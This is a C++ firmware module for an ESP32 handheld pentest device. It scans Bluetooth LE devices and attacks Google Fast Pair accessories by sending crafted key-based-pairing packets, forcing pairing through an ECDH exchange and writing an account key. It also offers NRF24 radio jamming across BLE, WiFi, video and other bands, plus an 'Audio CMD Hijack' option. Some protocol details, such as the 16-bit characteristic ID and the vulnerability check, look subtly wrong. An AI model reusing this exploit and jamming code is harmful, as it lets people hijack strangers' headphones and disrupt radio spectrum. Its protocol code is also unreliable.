#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "fastpair_crypto.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"
#include "modules/NRF24/nrf_jammer_api.h"

extern std::vector<String> fastPairDevices;
extern bool returnToMenu;

#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif

AudioCommandService audioCmd;
FastPairCrypto crypto;

int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char* btn2 = "", const char* btn3 = "", uint16_t color = TFT_WHITE, bool showEscHint = true) {
    int buttonCount = 0;
    if(strlen(btn1) > 0) buttonCount++;
    if(strlen(btn2) > 0) buttonCount++;
    if(strlen(btn3) > 0) buttonCount++;

    if(buttonCount == 0) {
        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 80, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        tft.print(line1);

        if(showEscHint) {
            tft.setCursor(20, 120);
            tft.print("Press ESC to exit");
        } else {
            tft.setCursor(20, 120);
            tft.print("Press any key...");
        }

        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(showEscHint == false && (check(SelPress) || check(PrevPress) || check(NextPress))) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else if(buttonCount == 1) {
        const char* buttons[] = {btn1, btn2, btn3};
        const char* actualBtn = "";
        for(int i = 0; i < 3; i++) {
            if(strlen(buttons[i]) > 0) {
                actualBtn = buttons[i];
                break;
            }
        }

        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        tft.print(line1);

        int btnWidth = 100;
        int btnX = (tftWidth - btnWidth) / 2;
        int btnY = 140;

        tft.fillRoundRect(btnX, btnY, btnWidth, 30, 5, bruceConfig.priColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.priColor);

        int textWidth = strlen(actualBtn) * 6;
        int textX = btnX + (btnWidth - textWidth) / 2;
        tft.setCursor(textX, btnY + 10);
        tft.print(actualBtn);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 180);
        tft.print("SEL: Select  ESC: Cancel");

        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(check(SelPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else {
        return displayMessage(line1, btn1, btn2, btn3, color);
    }
}

bool initBLEIfNeeded(const char* deviceName) {
    static bool initialized = false;

    if (!initialized) {
        NimBLEDevice::init(deviceName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
        initialized = true;
    }

    return true;
}

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");

    tft.fillRect(20, 50, tftWidth - 40, 100, bruceConfig.bgColor);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print(message);
    tft.setCursor(20, 100);
    tft.print("Press SEL to confirm");
    tft.setCursor(20, 120);
    tft.print("or ESC to cancel");

    while(true) {
        if(check(EscPress)) {
            showAdaptiveMessage("Cancelled", "OK", "", "", TFT_WHITE);
            return false;
        }
        if(check(SelPress)) {
            showAdaptiveMessage("Confirmed!", "OK", "", "", TFT_WHITE);
            delay(300);
            return true;
        }
        delay(50);
    }
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    showAdaptiveMessage("Connecting to target...", "", "", "", TFT_WHITE, false);

    NimBLEClient* pClient = NimBLEDevice::createClient();

    if(!pClient->connect(target, true)) {
        showAdaptiveMessage("Connection failed", "OK", "", "", TFT_RED);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    showAdaptiveMessage("Connected, discovering...", "", "", "", TFT_WHITE, false);

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        showAdaptiveMessage("Fast Pair service not found", "OK", "", "", TFT_YELLOW);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        showAdaptiveMessage("KBP char not found", "OK", "", "", TFT_YELLOW);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;

    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);

    memcpy(&packet[2], targetBytes, 6);
    esp_fill_random(&packet[8], 8);

    showAdaptiveMessage("Sending test packet...", "", "", "", TFT_WHITE, false);

    if(pChar->writeValue(packet, 16, false)) {
        showAdaptiveMessage("Packet sent, checking...", "", "", "", TFT_WHITE, false);
        delay(100);

        bool vulnerable = pChar->canRead() || pChar->canNotify();
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);

        if(vulnerable) {
            showAdaptiveMessage("DEVICE VULNERABLE!", "OK", "", "", TFT_GREEN);
            return true;
        } else {
            showAdaptiveMessage("No response - may be patched", "OK", "", "", TFT_YELLOW);
            return false;
        }
    }

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
    showAdaptiveMessage("Connecting...", "", "", "", TFT_WHITE, false);

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target, true)) {
        showAdaptiveMessage("Connect failed", "OK", "", "", TFT_RED);
        return false;
    }

    showAdaptiveMessage("Connected, discovering...", "", "", "", TFT_WHITE, false);

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        showAdaptiveMessage("No FastPair service", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        showAdaptiveMessage("No KBP char", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    showAdaptiveMessage("Generating key...", "", "", "", TFT_WHITE, false);

    uint8_t our_pubkey[65];
    size_t pub_len = 65;
    if(!crypto.generateKeyPair(our_pubkey, &pub_len)) {
        showAdaptiveMessage("Key gen failed", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    uint8_t keyExchangeMsg[67] = {0};
    keyExchangeMsg[0] = 0x00;
    keyExchangeMsg[1] = 0x20;
    memcpy(&keyExchangeMsg[2], our_pubkey, 65);

    showAdaptiveMessage("Sending key...", "", "", "", TFT_WHITE, false);

    if(!pKeyChar->writeValue(keyExchangeMsg, 67, false)) {
        showAdaptiveMessage("Send failed", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    delay(100);
    showAdaptiveMessage("Waiting response...", "", "", "", TFT_WHITE, false);

    std::string response = pKeyChar->readValue();
    if(response.length() < 67) {
        showAdaptiveMessage("Bad response", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    const uint8_t* their_pubkey = (const uint8_t*)response.c_str() + 2;
    if(!crypto.computeSharedSecret(their_pubkey, 65)) {
        showAdaptiveMessage("Shared secret failed", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    memcpy(shared_secret, crypto.getSharedSecret(), 32);
    pClient->disconnect();
    return true;
}

bool fastpair_complete_pairing(NimBLEAddress target, const uint8_t* shared_secret) {
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target, true)) return false;

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        return false;
    }

    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        pClient->disconnect();
        return false;
    }

    uint8_t nonce[16];
    esp_fill_random(nonce, 16);

    uint8_t pairingData[50] = {0};
    pairingData[0] = 0x00;
    pairingData[1] = 0x30;
    memcpy(&pairingData[2], nonce, 16);
    memcpy(&pairingData[18], shared_secret, 16);

    if(!pKeyChar->writeValue(pairingData, 34, false)) {
        pClient->disconnect();
        return false;
    }

    delay(100);

    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
    if(pAccountChar) {
        crypto.generateAccountKey();
        pAccountChar->writeValue(crypto.getAccountKey(), 16, true);
    }

    pClient->disconnect();
    return true;
}

bool whisperPairFullExploit(NimBLEAddress target) {
    uint8_t shared_secret[32];

    if(!fastpair_ecdh_key_exchange(target, shared_secret)) return false;
    if(!fastpair_complete_pairing(target, shared_secret)) return false;

    return true;
}

String selectTargetFromScan(const char* title) {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("SCANNING...");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 110);
    tft.print("Time: 0/15 seconds");
    tft.setCursor(20, 130);
    tft.print("Found: 0");
    tft.setCursor(20, 180);
    tft.print("ESC: Cancel");
    
    NimBLEDevice::deinit(true);
    delay(100);
    NimBLEDevice::init("Bruce-Scanner");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    
    NimBLEScan* pScan = NimBLEDevice::getScan();
    if (!pScan) {
        tft.fillRect(20, 110, 200, 40, bruceConfig.bgColor);
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.setCursor(20, 110);
        tft.print("Scanner init failed!");
        delay(2000);
        return "";
    }
    
    int foundDevices = 0;
    unsigned long lastDeviceTime = 0;
    
    class ScanCallbacks : public NimBLEScanCallbacks {
    private:
        int& count;
        unsigned long& lastTime;
        
    public:
        ScanCallbacks(int& c, unsigned long& t) : count(c), lastTime(t) {}
        
        void onResult(NimBLEAdvertisedDevice* device) {
            count++;
            lastTime = millis();
        }
    };
    
    ScanCallbacks scanCallbacks(foundDevices, lastDeviceTime);
    pScan->setScanCallbacks(&scanCallbacks, false);
    pScan->setActiveScan(true);
    pScan->setInterval(67);
    pScan->setWindow(33);
    pScan->setDuplicateFilter(false);
    pScan->setMaxResults(0);
    
    unsigned long scanStart = millis();
    pScan->start(0, true);
    
    unsigned long lastTimeUpdate = 0;
    int lastDisplayedCount = 0;
    
    while (millis() - scanStart < 15000) {
        unsigned long now = millis();
        int elapsed = (now - scanStart) / 1000;
        
        if (now - lastTimeUpdate >= 1000) {
            lastTimeUpdate = now;
            tft.fillRect(80, 110, 30, 15, bruceConfig.bgColor);
            tft.setCursor(80, 110);
            tft.print(elapsed);
        }
        
        if (foundDevices != lastDisplayedCount) {
            lastDisplayedCount = foundDevices;
            tft.fillRect(80, 130, 30, 15, bruceConfig.bgColor);
            tft.setCursor(80, 130);
            tft.print(foundDevices);
        }
        
        if (check(EscPress)) {
            pScan->stop();
            delay(50);
            return "";
        }
        
        delay(10);
    }
    
    pScan->stop();
    NimBLEScanResults results = pScan->getResults();
    
    std::vector<const NimBLEAdvertisedDevice*> devicesList;
    for(int i = 0; i < results.getCount(); i++) {
        const NimBLEAdvertisedDevice* device = results.getDevice(i);
        if(device) devicesList.push_back(device);
    }
    
    int storedCount = devicesList.size();
    pScan->clearResults();
    
    tft.fillRect(20, 110, 200, 40, bruceConfig.bgColor);
    tft.setCursor(20, 110);
    tft.print("Scan complete!");
    tft.setCursor(20, 130);
    tft.printf("Found: %d devices", storedCount);
    
    if (storedCount == 0) {
        tft.setCursor(20, 160);
        tft.print("No devices found");
        tft.setCursor(20, 180);
        tft.print("See Serial Monitor");
        tft.setCursor(20, 210);
        tft.print("Press any key...");
        
        while (!check(EscPress) && !check(SelPress)) delay(50);
        return "";
    }
    
    tft.fillRect(20, 160, 200, 40, bruceConfig.bgColor);
    tft.setCursor(20, 160);
    tft.print("Processing...");
    
    std::vector<Option> deviceOptions;
    String selectedMAC = "";
    uint8_t selectedAddrType = 0;
    
    struct SimpleDevice {
        String name;
        String address;
        uint8_t type;
        int rssi;
    };
    std::vector<SimpleDevice> devices;
    
    for (int i = 0; i < min(storedCount, 30); i++) {
        const NimBLEAdvertisedDevice* device = devicesList[i];
        if (!device) continue;
        
        SimpleDevice dev;
        dev.name = device->getName().c_str();
        dev.address = device->getAddress().toString().c_str();
        dev.type = device->getAddressType();
        dev.rssi = device->getRSSI();
        
        if (dev.name.isEmpty() || dev.name == "null") {
            dev.name = dev.address;
        }
        
        devices.push_back(dev);
    }
    
    std::sort(devices.begin(), devices.end(), 
              [](const SimpleDevice& a, const SimpleDevice& b) {
                  return a.rssi > b.rssi;
              });
    
    for (size_t i = 0; i < devices.size(); i++) {
        const auto& dev = devices[i];
        
        String displayText = dev.name;
        if (displayText.length() > 18) {
            displayText = displayText.substring(0, 15) + "...";
        }
        displayText += " (" + String(dev.rssi) + "dB)";
        
        String mac = dev.address;
        uint8_t type = dev.type;
        
        deviceOptions.push_back({displayText.c_str(), [&selectedMAC, &selectedAddrType, mac, type]() {
            selectedMAC = mac;
            selectedAddrType = type;
        }});
    }
    
    deviceOptions.push_back({"[Back]", []() {}});
    
    tft.fillScreen(bruceConfig.bgColor);
    loopOptions(deviceOptions, MENU_TYPE_SUBMENU, "SELECT DEVICE", 0, false);
    
    if (!selectedMAC.isEmpty()) {
        return selectedMAC + ":" + String(selectedAddrType);
    }
    
    return "";
}

void testFastPairVulnerability() {
    initBLEIfNeeded("Bruce-WP");
    
    String selectedInfo = selectTargetFromScan("FAST PAIR SCAN");
    if(selectedInfo.isEmpty()) return;
    
    int colonPos = selectedInfo.lastIndexOf(':');
    if(colonPos == -1) {
        showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
        return;
    }
    
    String selectedMAC = selectedInfo.substring(0, colonPos);
    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
    
    NimBLEAddress target;
    try {
        target = NimBLEAddress(selectedMAC.c_str(), addrType);
    } catch (...) {
        showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
        return;
    }
    
    if(!requireSimpleConfirmation("Test vulnerability?\nSEL=Yes  ESC=No")) return;
    
    bool vulnerable = attemptKeyBasedPairing(target);
    
    delay(2000);
}

bool runExploitOnConnectedDevice(NimBLEClient* pClient, NimBLEAddress target) {
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) return false;
    
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pChar) return false;
    
    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;
    
    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);
    
    memcpy(&packet[2], targetBytes, 6);
    esp_fill_random(&packet[8], 8);
    
    if(pChar->writeValue(packet, 16, false)) {
        delay(50);
        bool vulnerable = pChar->canRead() || pChar->canNotify();
        
        if(vulnerable) {
            showAdaptiveMessage("EXPLOIT SUCCESS!", "Vulnerable device", "", "", TFT_GREEN);
            return true;
        }
    }
    return false;
}

void aggressiveJamAndExploit(NimBLEAddress target) {
    if(isNRF24Available()) {
        showAdaptiveMessage("Aggressive Signal Attack", "Multiple disruption bursts", "", "", TFT_YELLOW, false);
        
        for(int i = 0; i < 3; i++) {
            startJammer();
            delay(500);
            stopJammer();
            delay(200);
            
            showAdaptiveMessage(("Burst " + String(i+1) + "/3").c_str(), "Attempting connection...", "", "", TFT_YELLOW, false);
            
            NimBLEClient* pClient = NimBLEDevice::createClient();
            pClient->setConnectTimeout(2);
            
            if(pClient->connect(target, false)) {
                showAdaptiveMessage(("Connected on burst " + String(i+1)).c_str(), "Running exploit...", "", "", TFT_WHITE, false);
                
                if(runExploitOnConnectedDevice(pClient, target)) {
                    NimBLEDevice::deleteClient(pClient);
                    return;
                }
                pClient->disconnect();
            }
            NimBLEDevice::deleteClient(pClient);
        }
    }
    
    showAdaptiveMessage("Fallback: Direct attempt", "", "", "", TFT_YELLOW, false);
    
    NimBLEClient* pClient = NimBLEDevice::createClient();
    pClient->setConnectTimeout(5);
    
    if(pClient->connect(target, false)) {
        showAdaptiveMessage("Direct connection", "Running exploit...", "", "", TFT_WHITE, false);
        runExploitOnConnectedDevice(pClient, target);
        pClient->disconnect();
    } else {
        showAdaptiveMessage("Connection failed", "Device may be", "connected elsewhere", "OK", TFT_RED);
    }
    
    NimBLEDevice::deleteClient(pClient);
}

void jamAndConnectMenu() {
    if(!isNRF24Available()) {
        tft.fillScreen(TFT_RED);
        drawMainBorderWithTitle("NRF24 JAMMER");
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.setCursor(20, 60);
        tft.print("NRF24L01+ Module");
        tft.setCursor(20, 90);
        tft.print("Status: NOT FOUND");
        tft.setCursor(20, 120);
        tft.print("Connect module and");
        tft.setCursor(20, 140);
        tft.print("restart device");
        tft.setCursor(20, 180);
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.print("Press any key to return");
        
        while(true) {
            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                delay(200);
                return;
            }
            delay(50);
        }
    }
    
    const char* jamModeNames[] = {
        "BLE Adv Only",
        "All BLE Channels",
        "BLE Adv Priority",
        "Bluetooth All",
        "WiFi",
        "USB",
        "Video",
        "RC",
        "Full Spectrum"
    };
    
    std::vector<Option> jamOptions;
    
    jamOptions.push_back({"[Scan then Jam Connect]", [&]() {
        String selectedInfo = selectTargetFromScan("SCAN TARGET");
        if(selectedInfo.isEmpty()) return;
        
        int colonPos = selectedInfo.lastIndexOf(':');
        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
        NimBLEAddress target(selectedMAC.c_str(), addrType);
        
        if(requireSimpleConfirmation("Jam while connecting?")) {
            showAdaptiveMessage(("Jamming: " + String(jamModeNames[getCurrentJammerMode()])).c_str(), 
                               "Attempting connection...", "", "", TFT_YELLOW, false);
            
            startJammer();
            
            unsigned long startTime = millis();
            NimBLEClient* pClient = NimBLEDevice::createClient();
            pClient->setConnectTimeout(5);
            
            bool connected = false;
            while(millis() - startTime < 5000 && !connected) {
                updateJammerChannel();
                
                if(pClient->connect(target, false)) {
                    connected = true;
                    showAdaptiveMessage("Connected!", "Running exploit...", "", "", TFT_WHITE, false);
                    runExploitOnConnectedDevice(pClient, target);
                    pClient->disconnect();
                    break;
                }
                delay(100);
            }
            
            if(!connected) {
                showAdaptiveMessage("Connection failed", "Device may be paired", "or out of range", "OK", TFT_RED);
            }
            
            stopJammer();
            NimBLEDevice::deleteClient(pClient);
        }
    }});
    
    jamOptions.push_back({"[Jam Burst Attack]", [&]() {
        String selectedInfo = selectTargetFromScan("SELECT TARGET");
        if(selectedInfo.isEmpty()) return;
        
        int colonPos = selectedInfo.lastIndexOf(':');
        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
        
        NimBLEAddress target;
        try {
            target = NimBLEAddress(selectedMAC.c_str(), addrType);
        } catch (...) {
            showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
            return;
        }
        
        if(requireSimpleConfirmation("Start jam burst attack?")) {
            aggressiveJamAndExploit(target);
        }
    }});
    
    jamOptions.push_back({"[Set Jammer Mode]", [&]() {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("JAMMER MODE");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        
        tft.setCursor(20, 60);
        tft.print("Current: ");
        tft.print(jamModeNames[getCurrentJammerMode()]);
        
        int yPos = 90;
        for(int i = 0; i < 5; i++) {
            tft.setCursor(20, yPos);
            tft.print(String(i+1) + ". " + jamModeNames[i]);
            yPos += 20;
        }
        
        tft.setCursor(20, yPos);
        tft.print("SEL: Select  ESC: Back");
        
        int selection = getCurrentJammerMode();
        bool redraw = true;
        
        while(true) {
            if(check(EscPress)) return;
            
            if(redraw) {
                tft.fillRect(20, 210, tftWidth - 40, 30, bruceConfig.bgColor);
                tft.setCursor(20, 210);
                tft.print(">> " + String(jamModeNames[selection]));
                redraw = false;
            }
            
            if(check(PrevPress)) {
                if(selection > 0) {
                    selection--;
                    redraw = true;
                }
            }
            if(check(NextPress)) {
                if(selection < 8) {
                    selection++;
                    redraw = true;
                }
            }
            
            if(check(SelPress)) {
                setJammerMode(selection);
                showAdaptiveMessage(("Jam mode set to: " + String(jamModeNames[selection])).c_str(), 
                                   "OK", "", "", TFT_GREEN);
                delay(1000);
                return;
            }
            
            delay(50);
        }
    }});
    
    jamOptions.push_back({"[Jammer Status]", [&]() {
        showAdaptiveMessage("NRF24 Jammer Status", 
                           ("Mode: " + String(jamModeNames[getCurrentJammerMode()])).c_str(),
                           "Channel: Hopping",
                           "OK", TFT_YELLOW);
    }});
    
    jamOptions.push_back({"[Back]", []() {}});
    
    loopOptions(jamOptions, MENU_TYPE_SUBMENU, "JAM & CONNECT", 0, false);
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;

    options.push_back({"[Scan & Test]", []() {
        testFastPairVulnerability();
    }});

    options.push_back({"[Full Pair Test]", []() {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("FULL PAIR EXPLOIT");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(1);

        tft.fillRect(20, 50, tftWidth - 40, 150, bruceConfig.bgColor);

        int lineHeight = 18;
        int startY = 50;

        tft.setCursor(20, startY);
        tft.print("This will attempt full pairing:");

        tft.setCursor(20, startY + lineHeight);
        tft.print("1. Connect to target");

        tft.setCursor(20, startY + (lineHeight * 2));
        tft.print("2. ECDH key exchange");

        tft.setCursor(20, startY + (lineHeight * 3));
        tft.print("3. Complete pairing");

        tft.setCursor(20, startY + (lineHeight * 4));
        tft.print("4. Store account key");

        tft.fillRect(20, startY + (lineHeight * 5) + 10, tftWidth - 40, 30, bruceConfig.bgColor);
        String prompt = "Press SEL to continue - ESC to cancel";
        int textWidth = prompt.length() * 6;
        int centerX = (tftWidth - textWidth) / 2;
        if (centerX < 20) centerX = 20;
        tft.setCursor(centerX, startY + (lineHeight * 5) + 10);
        tft.print(prompt);

        while(true) {
            if(check(EscPress)) return;
            if(check(SelPress)) break;
            delay(50);
        }

        String selectedInfo = selectTargetFromScan("SELECT TARGET");
        if(selectedInfo.isEmpty()) return;

        int colonPos = selectedInfo.lastIndexOf(':');
        if(colonPos == -1) {
            showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
            return;
        }

        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();

        NimBLEAddress target;
        try {
            target = NimBLEAddress(selectedMAC.c_str(), addrType);
        } catch (...) {
            showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
            return;
        }

        int8_t confirm = displayMessage("Confirm full exploit?", "No", "Yes", "Back", TFT_YELLOW);
        if(confirm != 1) return;

        bool success = whisperPairFullExploit(target);
        if(success) {
            showAdaptiveMessage("EXPLOIT SUCCESSFUL!", "OK", "", "", TFT_GREEN);
        } else {
            showAdaptiveMessage("Exploit failed", "OK", "", "", TFT_RED);
        }
    }});

    options.push_back({"[Jam & Connect]", []() {
        jamAndConnectMenu();
    }});

    options.push_back({"[Audio CMD Hijack]", []() {
        audioCommandHijackTest();
    }});

    options.push_back({"[Back]", []() { returnToMenu = true; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}